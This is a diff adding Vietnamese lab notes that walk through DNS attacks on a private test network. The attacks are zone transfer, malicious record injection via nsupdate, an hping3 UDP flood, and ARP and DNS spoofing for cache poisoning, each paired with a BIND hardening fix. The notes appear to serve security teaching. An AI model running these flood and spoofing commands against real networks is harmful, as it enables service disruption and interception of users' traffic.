@@ -1,0 +1,72 @@
+Kịch bản DNS attack
+
+Bình thường nếu để ở thư mục /etc/bind/
+--> Ubuntu server sử dụng hệ thống bảo mật tên AppArmor và nó quy định là chỉ cho phép đọc ở /etc/bind không cho phép ghi hay tạo mới file ở đó nên khi chạy lệnh send nó sẽ 
+
+sudo nano /var/lib/bind/db.lab.local
+
+- Zone Transfer:
+dig NS lab.local @192.168.1.20
+dig axfr lab.local @192.168.1.20
+
+Cách khắc phục: Mở file /etc/bind/named.conf.local (hoặc /var/lib/bind/named.conf.local tùy cấu hình của bạn) và chỉnh sửa chỉ thị allow-transfer:
+allow-transfer { none; };
+
+Sau đó, máy Kali dùng lệnh dig axfr sẽ nhận được thông báo Transfer failed
+
+- Dynamic Update:
+Lợi dụng việc máy chủ Ubuntu cấu hình lỏng lẻo (allow-update { any; }), chúng ta sẽ chèn một tên miền độc hại vào hệ thống.
+
+nsupdate
+
+server 192.168.1.20
+update add hacker.lab.local 86400 A 192.168.1.10
+send
+quit
+
+dig hacker.lab.local @192.168.1.20
+
+Cách khắc phục:
+Cũng trong file cấu hình zone ở trên, bạn sửa lại chỉ thị allow-update: 
+allow-update { none; }
+
+
+DOS attack
+- Tấn công dos: 
+Mở một cửa sổ Terminal (gọi là Terminal 1). Gõ sẵn lệnh sau nhưng chưa ấn Enter
+dig bank.lab.local @192.168.1.20
+
+- Kích hoạt tấn công dos:
+sudo hping3 --udp -p 53 --flood 192.168.1.20
+
+Cách khắc phục:
+Mở file /etc/bind/named.conf.options và thêm khối rate-limit vào trong phần options { ... };:
+rate-limit {
+        responses-per-second 10;  // Chỉ trả lời tối đa 10 lần/giây cho cùng 1 IP
+        window 5;                 // Theo dõi hành vi trong cửa sổ 5 giây
+    };
+
+
+
+
+
+
+DNS Cache Poisoning
+
+VPC client: cấu hình ip
+ip 192.168.1.30/24 192.168.1.1
+ip dns 192.168.1.20
+
+tạo mồi nhử:
+sudo sysctl -w net.ipv4.ip_forward=1
+sudo iptables -I FORWARD -p udp --dport 53 -j DROP
+
+echo "192.168.1.10 www.lab.local" > fake_dns.txt
+
+sudo arpspoof -i eth0 -t 192.168.1.30 192.168.1.20
+
+sudo dnsspoof -i eth0 -f fake_dns.txt
+
+Cách khắc phục (Trên DNS Server):
+Vào file /etc/bind/named.conf.options và bật xác thực DNSSEC:
+dnssec-validation auto;
